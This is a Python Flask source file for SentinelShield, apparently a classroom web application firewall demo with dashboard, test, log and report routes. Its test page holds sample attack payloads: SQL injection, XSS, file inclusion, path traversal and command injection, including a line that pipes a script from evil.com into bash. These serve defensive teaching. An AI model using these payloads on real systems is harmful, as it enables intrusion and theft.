# =============================================================================
# app.py - SentinelShield Main Flask Application
# =============================================================================
# This is the entry point for the SentinelShield web application.
#
# Routes:
#   GET  /                   → Dashboard (main overview)
#   GET  /test               → Test Request page (submit payloads)
#   POST /analyze            → Analyze a submitted test request
#   GET  /logs               → View all request logs
#   GET  /report             → Summary report
#   GET  /api/stats          → JSON API for dashboard charts
#   GET  /api/logs           → JSON API for recent logs
#   POST /api/reset          → Clear all logs (demo reset)
#
# =============================================================================

from flask import Flask, render_template, request, jsonify, redirect, url_for
import json
import os
from datetime import datetime

# Import our WAF modules
from waf.detector import analyze_request
from waf.rate_limiter import check_rate_limit, get_all_flagged_ips, get_ip_stats, get_rate_limit_config
from waf.logger import init_database, log_request, get_recent_logs, get_dashboard_stats, clear_all_logs

# -----------------------------------------------------------------------------
# App Setup
# -----------------------------------------------------------------------------
app = Flask(__name__)
app.secret_key = "sentinelshield-demo-secret-key"  # Change in production!

# Initialize the database on startup
init_database()


# -----------------------------------------------------------------------------
# Helper: Get client IP address
# -----------------------------------------------------------------------------
def get_client_ip():
    """
    Get the real client IP address.
    Checks X-Forwarded-For header first (for proxies/load balancers),
    then falls back to the direct connection IP.
    """
    # Check if behind a proxy
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        # X-Forwarded-For can be a comma-separated list; first one is client
        return forwarded_for.split(",")[0].strip()
    return request.remote_addr or "127.0.0.1"


# =============================================================================
# ROUTE: Dashboard
# =============================================================================
@app.route("/")
def dashboard():
    """
    Main dashboard page showing:
    - Request statistics (total, blocked, allowed)
    - Attack type breakdown chart
    - Flagged IPs
    - Recent alerts
    """
    stats = get_dashboard_stats()
    flagged_ips = get_all_flagged_ips()
    
    return render_template(
        "dashboard.html",
        stats=stats,
        flagged_ips=flagged_ips,
        page="dashboard"
    )


# =============================================================================
# ROUTE: Test Request Page
# =============================================================================
@app.route("/test")
def test_page():
    """
    Test request submission page.
    Students can manually enter request payloads and see detection results.
    """
    # Sample attack payloads for demonstration
    sample_payloads = {
        "normal": [
            "Hello, my name is Alice",
            "Search query: weather today",
            "product_id=123&category=electronics",
            "username=john&email=john@example.com",
        ],
        "sqli": [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "UNION SELECT username, password FROM users",
            "1' AND SLEEP(5)--",
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ],
        "lfi": [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "....//....//etc/shadow",
            "/proc/self/environ",
        ],
        "traversal": [
            "../../../windows/system32",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/hosts",
            "%252e%252e%252fetc%252fpasswd",
        ],
        "cmdi": [
            "; ls -la /etc",
            "| cat /etc/passwd",
            "&& whoami",
            "$(curl http://evil.com/shell.sh | bash)",
        ],
    }
    
    rate_config = get_rate_limit_config()
    
    return render_template(
        "test_request.html",
        sample_payloads=sample_payloads,
        rate_config=rate_config,
        page="test"
    )


# =============================================================================
# ROUTE: Analyze Request (POST handler for test page)
# =============================================================================
@app.route("/analyze", methods=["POST"])
def analyze():
    """
    Receives a test request from the test page, runs it through the WAF,
    and returns the detection result.
    
    Accepts form fields:
      - method: HTTP method (GET/POST)
      - path: URL path being tested
      - payload: The main input to test
      - test_header: Optional suspicious header value
    """
    client_ip = get_client_ip()
    method = request.form.get("method", "GET").upper()
    path = request.form.get("path", "/test")
    payload = request.form.get("payload", "")
    test_header = request.form.get("test_header", "")
    
    # --- Step 1: Check rate limiting ---
    rate_result = check_rate_limit(client_ip)
    
    # --- Step 2: Build request data for WAF inspection ---
    request_data = {
        "path": path,
        "query_string": f"input={payload}",
        "params": {"input": payload},
        "headers": {},
        "body": payload,
        "form_data": {"payload": payload},
    }
    
    # Add test header if provided
    if test_header:
        request_data["headers"]["user-agent"] = test_header
    
    # --- Step 3: Run WAF detection ---
    detection_result = analyze_request(request_data)
    
    # --- Step 4: Log the request ---
    log_id = log_request(
        ip=client_ip,
        method=method,
        path=path,
        query=f"input={payload[:100]}",
        detection_result=detection_result,
        rate_result=rate_result,
    )
    
    # --- Step 5: Determine final status ---
    if not rate_result["allowed"]:
        final_status = rate_result["status"]
        blocked = True
    elif detection_result["is_malicious"]:
        final_status = "BLOCKED"
        blocked = True
    else:
        final_status = "ALLOWED"
        blocked = False
    
    # Build response for display
    result = {
        "status": final_status,
        "blocked": blocked,
        "ip": client_ip,
        "method": method,
        "path": path,
        "payload": payload[:200],
        "log_id": log_id,
        "detection": {
            "is_malicious": detection_result["is_malicious"],
            "summary": detection_result["summary"],
            "severity": detection_result["highest_severity"],
            "categories": detection_result["categories"],
            "detections": detection_result["detections"][:5],  # Show first 5
            "total_matches": detection_result["total_matches"],
        },
        "rate_limit": {
            "status": rate_result["status"],
            "request_count": rate_result["request_count"],
            "message": rate_result["message"],
        },
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    return render_template(
        "test_request.html",
        result=result,
        page="test",
        sample_payloads={},
        rate_config=get_rate_limit_config()
    )


# =============================================================================
# ROUTE: Logs Page
# =============================================================================
@app.route("/logs")
def logs_page():
    """
    Display all request logs in a filterable table.
    Students can filter by status, search for specific IPs, etc.
    """
    filter_status = request.args.get("status", None)
    limit = int(request.args.get("limit", 100))
    
    logs = get_recent_logs(limit=limit, filter_status=filter_status)
    stats = get_dashboard_stats()
    
    return render_template(
        "logs.html",
        logs=logs,
        filter_status=filter_status,
        stats=stats,
        page="logs"
    )


# =============================================================================
# ROUTE: Report Page
# =============================================================================
@app.route("/report")
def report_page():
    """
    Generate a practical session report with:
    - Summary statistics
    - Attack breakdown
    - Flagged IPs
    - Recommendations
    """
    stats = get_dashboard_stats()
    logs = get_recent_logs(limit=200)
    flagged_ips = get_all_flagged_ips()
    
    # Group logs by category for report
    malicious_logs = [l for l in logs if l.get("is_malicious")]
    allowed_logs = [l for l in logs if not l.get("is_malicious") and l.get("status") == "ALLOWED"]
    
    # Generate security recommendations based on findings
    recommendations = []
    if stats["attack_breakdown"].get("sqli", 0) > 0:
        recommendations.append({
            "type": "SQL Injection Prevention",
            "action": "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
            "priority": "CRITICAL"
        })
    if stats["attack_breakdown"].get("xss", 0) > 0:
        recommendations.append({
            "type": "XSS Prevention",
            "action": "Escape all output with context-aware encoding. Implement a Content Security Policy (CSP) header.",
            "priority": "HIGH"
        })
    if stats["attack_breakdown"].get("lfi", 0) > 0 or stats["attack_breakdown"].get("traversal", 0) > 0:
        recommendations.append({
            "type": "File Access Controls",
            "action": "Validate and whitelist file paths. Never pass user input directly to file system functions.",
            "priority": "CRITICAL"
        })
    if stats["attack_breakdown"].get("cmdi", 0) > 0:
        recommendations.append({
            "type": "Command Injection Prevention",
            "action": "Never pass user input to shell commands. Use safe API alternatives for OS operations.",
            "priority": "CRITICAL"
        })
    if stats["rate_limited_requests"] > 0:
        recommendations.append({
            "type": "Rate Limiting Enforcement",
            "action": "Consider lowering the rate limit threshold or implementing CAPTCHA for suspicious IPs.",
            "priority": "MEDIUM"
        })
    
    if not recommendations:
        recommendations.append({
            "type": "Continue Monitoring",
            "action": "No attacks detected yet. Run test payloads from the Test page to generate a report.",
            "priority": "INFO"
        })
    
    return render_template(
        "report.html",
        stats=stats,
        logs=logs,
        malicious_logs=malicious_logs,
        allowed_logs=allowed_logs,
        flagged_ips=flagged_ips,
        recommendations=recommendations,
        generated_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        page="report"
    )


# =============================================================================
# API ROUTES (JSON) - Used by dashboard JavaScript
# =============================================================================

@app.route("/api/stats")
def api_stats():
    """JSON endpoint for dashboard charts."""
    stats = get_dashboard_stats()
    return jsonify(stats)


@app.route("/api/logs")
def api_logs():
    """JSON endpoint for recent logs."""
    limit = int(request.args.get("limit", 20))
    logs = get_recent_logs(limit=limit)
    return jsonify(logs)


@app.route("/api/reset", methods=["POST"])
def api_reset():
    """Clear all logs for a fresh demo. (Demo/testing use only)"""
    clear_all_logs()
    return jsonify({"success": True, "message": "All logs cleared successfully."})

@app.route("/blocked")
def blocked():
    return render_template("blocked.html")
# =============================================================================
# Run the Application
# =============================================================================
if __name__ == "__main__":
    import os

    port = int(os.environ.get("PORT", 5000))

    print("=" * 60)
    print("  SentinelShield - Intrusion Detection System")
    print(f"  Starting on port {port}")
    print("=" * 60)

    app.run(debug=False, host="0.0.0.0", port=port)